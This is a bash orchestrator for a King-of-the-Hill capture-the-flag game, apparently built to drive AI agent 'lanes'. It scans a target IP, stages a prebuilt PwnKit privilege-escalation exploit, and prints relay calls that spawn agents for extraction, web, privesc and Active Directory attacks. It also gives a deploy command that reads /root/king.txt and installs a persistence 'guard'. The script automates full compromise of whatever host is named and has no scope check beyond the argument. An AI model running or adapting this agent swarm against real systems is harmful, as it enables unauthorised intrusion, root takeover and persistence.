#!/usr/bin/env bash
# koth-fastroot.sh — T0 fast-root orchestrator for KotH (one host).
# usage: koth-fastroot.sh <IP> [--king NAME] [--state DIR]
#                         [--spawn relay|cli|none] [--dry-run] [--skip-quick] [--no-full]
#
# T0 plan:
#   quick scan (<=15s) + probe + triage + background full scan
#   -> board init -> stage prebuilt exploits -> swarm plan (LANE-1..5)
#   -> launch/print lanes: 1 extractor, 2 web, 4 privesc (+3 if AD ports)
#   lane 5 verifier is launched at root.
set -u
IP=""; KING=""; STATE=""; SPAWN="relay"; DRY=0; SKIPQ=0; NOFULL=0
while [ $# -gt 0 ]; do
  case "$1" in
    --king)      KING="${2:-}"; shift 2 ;;
    --state)     STATE="${2:-}"; shift 2 ;;
    --spawn)     SPAWN="${2:-relay}"; shift 2 ;;
    --dry-run)   DRY=1; shift ;;
    --skip-quick) SKIPQ=1; shift ;;
    --no-full)   NOFULL=1; shift ;;
    -h|--help)   sed -n '2,12p' "$0"; exit 0 ;;
    -*)          echo "unknown flag: $1" >&2; exit 2 ;;
    *)           IP="$1"; shift ;;
  esac
done
[ -n "$IP" ] || { echo "usage: $0 <IP> [--king NAME] [--state DIR] [--spawn relay|cli|none] [--dry-run]" >&2; exit 2; }
HERE="$(cd "$(dirname "$0")" && pwd)"
STATE="${STATE:-$HOME/Projects/KOTH-OPS/state/$IP}"
[ -n "$KING" ] || KING="$(tr -d '\n' < "$HOME/.codex/koth-user" 2>/dev/null || true)"
mkdir -p "$STATE"/{recon,loot,logs,swarm}
echo "[*] target=$IP state=$STATE king=${KING:-<unset>} spawn=$SPAWN"
[ "$DRY" = 1 ] && echo "[*] DRY-RUN: no target traffic, no spawn"

# 1) quickstart: preflight + quick scan + parallel probe + triage + bg full scan
if [ "$SKIPQ" = 0 ] && [ "$DRY" = 0 ]; then
  if [ -x "$HERE/quickstart.sh" ]; then
    QARGS=("$IP" "$STATE"); [ "$NOFULL" = 1 ] && QARGS+=(--no-full)
    timeout 180 bash "$HERE/quickstart.sh" "${QARGS[@]}" >"$STATE/logs/quickstart.log" 2>&1 \
      || echo "[!] quickstart rc=$? (see logs/quickstart.log)"
    tail -n 12 "$STATE/logs/quickstart.log" 2>/dev/null | sed 's/^/    /'
  fi
fi

# 2) ports (quick scan first, full scan as fallback)
PORTS=$(grep -hoE '^[0-9]+/tcp[[:space:]]+open' "$STATE"/recon/quick*.txt 2>/dev/null \
        | cut -d/ -f1 | sort -un | paste -sd, -)
[ -n "$PORTS" ] || PORTS=$(grep -hoE '^[0-9]+/tcp[[:space:]]+open' "$STATE"/recon/full-tcp.txt "$STATE"/recon/full.txt 2>/dev/null \
        | cut -d/ -f1 | sort -un | paste -sd, -)
echo "[*] ports: ${PORTS:-none}"

# 3) shared board
python3 "$HERE/delegate/board.py" init "$STATE" --scope "$IP" >/dev/null 2>&1 || true

# 4) stage prebuilt exploits (no compile on target)
mkdir -p "$STATE/loot/exploits"
if [ -d "$HERE/exploits" ]; then
  cp -f "$HERE/exploits"/PwnKit "$HERE/exploits"/PwnKit.c "$HERE/exploits"/deploy.sh \
        "$STATE/loot/exploits/" 2>/dev/null || true
  chmod +x "$STATE/loot/exploits/deploy.sh" 2>/dev/null || true
fi

# 5) plan exclusive lanes (writes LANE-1..5.md + LAUNCH.md)
python3 "$HERE/delegate/swarm.py" plan --ip "$IP" --state "$STATE" --ports "$PORTS" \
  --out "$STATE/swarm" 2>&1 | sed 's/^/    /' || true

# 6) lane selection: extractor + web + privesc; identity only if AD ports
SEL="1 2 4"
if echo ",$PORTS," | grep -qE ',(88|389|636|445|3268),'; then SEL="$SEL 3"; fi
echo "[*] selected lanes: $SEL (lane 5 verifier = at root)"

# 7) launch (cli) or print relay calls (relay) or nothing
case "$SPAWN" in
  cli)
    if [ "$DRY" = 1 ]; then
      echo "[dry] would launch lanes: $SEL"
    else
      for n in $SEL; do
        nohup python3 "$HERE/delegate/swarm.py" launch --ip "$IP" --state "$STATE" --lane "$n" \
          >>"$STATE/logs/swarm-launch.log" 2>&1 &
        echo "  lane $n launched (pid $!)"
      done
    fi
    ;;
  relay)
    echo
    echo "== paste these relay calls (preferred: background + sync_artifacts) =="
    for n in $SEL; do
      echo "codex_relay(task=\"\$(cat $STATE/swarm/LANE-$n.md)\", workspace=\"$STATE\", direction=\"general\", background=true, sync_artifacts=true)"
    done
    echo "agy_relay(task=\"Neutral CVE/room research only, no target traffic: <topic>\", workspace=\"$STATE\", direction=\"general\", background=true)"
    ;;
  none) ;;
  *) echo "[!] unknown --spawn $SPAWN" >&2; exit 2 ;;
esac

cat <<EOF

== T0 targets ==
  T+0    quick scan + lanes spawned
  T+60   foothold (credential-first: web/config/DB/keys)
  T+120  root (pre-staged exploit, no compile)
  after  king + guard + strip SUID + lane 5 verifier

== root path (pre-staged) ==
  PwnKit:  $STATE/loot/exploits/PwnKit
  deploy:  $HERE/exploits/deploy.sh $IP <key> <user> $STATE/loot/exploits/PwnKit 'id; cat /root/king.txt'
  king:    ${KING:-<set ~/.codex/koth-user>}
  guard:   $HERE/guard/install-guard.sh $IP "$KING" <pubkey> <root-key>
  verifier: python3 $HERE/delegate/swarm.py launch --ip $IP --state $STATE --lane 5
EOF
